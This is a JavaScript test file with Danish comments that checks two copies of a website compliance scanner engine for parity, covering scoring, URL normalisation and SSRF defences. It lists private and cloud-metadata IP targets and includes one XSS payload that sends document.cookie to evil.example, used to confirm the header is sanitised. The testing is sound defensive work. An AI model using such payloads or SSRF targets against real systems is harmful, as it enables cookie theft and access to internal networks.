/**
 * Paritetstest mellem de to kopier af scan-engineen.
 *
 *   node tools/test_engine_parity.mjs
 *
 * `shared/scan-engine.js` bruges af workerne, `eucomply-scanner/engine/index.js`
 * er den samme motor pakket til npm og tilfri gange. De er ikke byte-identiske
 * (den ene har CORS-headers og den anden en CLI-main), så de kan glide fra
 * hinanden — og det er de gjort:
 *
 *   25/9 2026: `UA` var erklæret i shared-versionen men ikke i npm-versionen.
 *   `runScan` læser den inde i sin egen try-blok, så fejlen blev kastet som
 *   "Could not reach <url>". Hver eneste scanning i den publicerede CLI fejlede,
 *   med en besked om et domæne der online uden problemer. `tools/test_worker_
 *   security.mjs` fandt det ikke, fordi den kun importerer shared-versionen.
 *
 * Derfor testes begge motorer side om side. Ingen dependencies, intet netværk:
 * fetch stubbes, og SSRF-målene er IP-literals, så DNS ikke slås op.
 */

import assert from "node:assert/strict";

import * as worker from "../shared/scan-engine.js";
import * as npm from "../eucomply-scanner/engine/index.js";

const ENGINES = { worker, npm };

let passed = 0;
const failures = [];

async function test(name, fn) {
  try {
    await fn();
    passed++;
  } catch (e) {
    failures.push(`${name}: ${e && e.message}`);
  }
}

/** fetch-stub der svarer nyt på hvert kald — et Response-body kan kun læses én gang. */
function stubFetch(body, headers = {}) {
  const saved = globalThis.fetch;
  globalThis.fetch = async () => new Response(body, { status: 200, headers: { "Content-Type": "text/html", ...headers } });
  return () => { globalThis.fetch = saved; };
}

/** IP-literals kun: assertPublicTarget slår værter op i DNS, og gaten skal ikke kræve netværk. */
const PRIVATE_TARGETS = [
  "https://127.0.0.1/",
  "https://127.0.0.1:8080/admin",
  "https://10.0.0.1/",
  "https://192.168.1.1/",
  "https://169.254.169.254/latest/meta-data/",
  "https://100.64.0.1/",
  "https://198.18.0.1/",
  "https://[::1]/",
  "https://[fc00::1]/",
  "https://[fe80::1]/",
  "https://[::ffff:127.0.0.1]/",
  "https://[64:ff9b::7f00:1]/",
  "https://[2002:7f00:1::1]/",
  "http://127.0.0.1/",
  "https://0.0.0.0/",
  "https://0177.0.0.1/",
];

/**
 * Værter der *ligner* en IP uden at være en fuld quad. Giver de gennem
 * `isPublicHostname` som et bart værtsnavn, fordi URL-parseren ellers
 * ekspanderer dem: "0x7f.0.0.1" bliver 127.0.0.1 og "1.2.3" bliver 1.2.0.3.
 */
const SHORTHAND_HOSTS = ["127.1", "1.2.3", "10.0.0.1.1", "0x7f.0.0.1", "2130706433", "0177.0.0.1", "localhost", "[::1]"];

const NORMALIZE_CASES = [
  ["example.com", "https://example.com"],
  ["http://example.com", "http://example.com"],
  ["https://example.com/", "https://example.com"],
  ["https://example.com/a?b=c#d", "https://example.com/a"],
  ["  https://example.com  ", "https://example.com"],
  ["ftp://example.com", null],
  ["javascript:alert(1)", null],
  ["not a url", null],
  ["https://127.0.0.1/", null],
  ["https://0x7f.0.0.1/", null],
  ["", null],
];

const GOOD_HTML = `<!doctype html><html lang="en"><head><title>Example</title></head>
<body><a href="/privacy">Privacy</a><a href="/imprint">Imprint</a>
<a href="/accessibility">Accessibility</a>
<form><input name="email"><button type="submit">Send</button></form></body></html>`;

/* ------------------------------------------------------------------ tests */

for (const [label, engine] of Object.entries(ENGINES)) {
  await test(`${label}: en komplet scanning gennemføres`, async () => {
    const restore = stubFetch(GOOD_HTML, { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" });
    try {
      const report = await engine.runScan("https://example.com");
      assert.equal(typeof report.score.pct, "number", "score.pct mangler");
      assert.ok(report.score.total > 0, "score.total er 0 — motoren scorede intet");
      assert.ok(Object.keys(report.checks).length >= 9, `kun ${Object.keys(report.checks).length} checks`);
      assert.equal(report.checks.ssl.pass, true);
      assert.match(report.checks.ssl.detail, /max-age=31536000/);
    } finally {
      restore();
    }
  });

  await test(`${label}: ni tjek med uforanderlige nøgler`, async () => {
    const restore = stubFetch(GOOD_HTML);
    try {
      const report = await engine.runScan("https://example.com");
      assert.deepEqual(
        Object.keys(report.checks),
        ["consent_mode_v2", "tcf", "trackers", "ssl", "cookies", "forms", "legal", "headers", "dora"],
      );
      assert.equal(report.score.total, 9);
    } finally {
      restore();
    }
  });

  await test(`${label}: privat og link-local SSRF-mål afvises`, async () => {
    for (const target of PRIVATE_TARGETS) {
      await assert.rejects(() => engine.safeFetch(target), /not a public website|Only http and https/, target);
    }
  });

  await test(`${label}: IP-shorthands afvises som bart værtsnavn`, async () => {
    for (const host of SHORTHAND_HOSTS) {
      assert.equal(engine.isPublicHostname(host), false, `isPublicHostname(${host})`);
    }
    assert.equal(engine.isPublicHostname("example.com"), true);
    assert.equal(engine.isPublicHostname("93.184.216.34"), true);
  });

  await test(`${label}: rå HSTS-header kan ikke smugle markup ind i resultatet`, async () => {
    const payload = 'max-age="1"><script>fetch(`https://evil.example/?c=`+document.cookie)</script>';
    const restore = stubFetch(GOOD_HTML, { "Strict-Transport-Security": payload });
    try {
      const report = await engine.runScan("https://example.com");
      const detail = report.checks.ssl.detail;
      assert.ok(!/[<>"'`\\]/.test(detail), `header-renderede markup: ${detail}`);
      assert.match(detail, /^HSTS: [A-Za-z0-9=\-.:/ ]*$/, `header indeholder tegn uden for headerdirektiver: ${detail}`);
    } finally {
      restore();
    }
  });

  await test(`${label}: en https→http-downgrade rapporteres som ikke-HTTPS`, async () => {
    const saved = globalThis.fetch;
    globalThis.fetch = async (input) => {
      const url = typeof input === "string" ? input : input.url;
      if (url.startsWith("http://")) return new Response("downgraded", { status: 200 });
      return new Response(null, { status: 302, headers: { location: "http://example.com/" } });
    };
    try {
      const report = await engine.runScan("https://example.com");
      assert.equal(report.checks.ssl.pass, false);
      assert.equal(report.checks.ssl.warn, false);
      assert.match(report.checks.ssl.label, /Not HTTPS/);
    } finally {
      globalThis.fetch = saved;
    }
  });

  await test(`${label}: normalizeUrl er ens`, async () => {
    for (const [input, expected] of NORMALIZE_CASES) {
      assert.equal(engine.normalizeUrl(input), expected, `normalizeUrl(${JSON.stringify(input)})`);
    }
  });

  await test(`${label}: de fire hjælpefunktioner findes og er eksporteret`, async () => {
    for (const fn of ["isPublicIPv4", "isPublicIPv6", "expandIPv6", "isPublicHostname", "readCappedText", "safeFetch", "runScan", "normalizeUrl", "assertPublicTarget"]) {
      assert.equal(typeof engine[fn], "function", `${label} mangler ${fn}`);
    }
  });
}

await test("begge motorer giver identisk resultat på den samme fixture", async () => {
  const restore = stubFetch(GOOD_HTML, { "Strict-Transport-Security": "max-age=63072000" });
  try {
    const a = await worker.runScan("https://example.com");
    const b = await npm.runScan("https://example.com");
    assert.deepEqual(Object.keys(b.checks), Object.keys(a.checks));
    assert.deepEqual(b.score, a.score);
    assert.equal(b.checks.ssl.detail, a.checks.ssl.detail);
    assert.equal(b.platform, a.platform);
    assert.equal(b.disclaimer, a.disclaimer);
  } finally {
    restore();
  }
});

await test("begge motorer afviser de samme SSRF-mål", async () => {
  for (const target of PRIVATE_TARGETS) {
    const verdicts = [];
    for (const engine of Object.values(ENGINES)) {
      verdicts.push(await engine.safeFetch(target).then(() => "accepteret", () => "afvist"));
    }
    assert.equal(verdicts[0], verdicts[1], `${target}: worker=${verdicts[0]} npm=${verdicts[1]}`);
    assert.equal(verdicts[0], "afvist", `${target} blev accepteret af begge motorer`);
  }
});

await test("begge motorer giver samme svar på IP-shorthands", async () => {
  for (const host of SHORTHAND_HOSTS) {
    assert.equal(npm.isPublicHostname(host), worker.isPublicHostname(host), `isPublicHostname(${host})`);
    assert.equal(npm.normalizeUrl(`https://${host}/`), worker.normalizeUrl(`https://${host}/`), `normalizeUrl(${host})`);
  }
});

/* ----------------------------------------------------------------- output */

for (const failure of failures) console.error(`FEJL  ${failure}`);
console.log(`${passed} engine parity checks passed${failures.length ? `, ${failures.length} FAILED` : ""}`);
process.exit(failures.length ? 1 : 0);
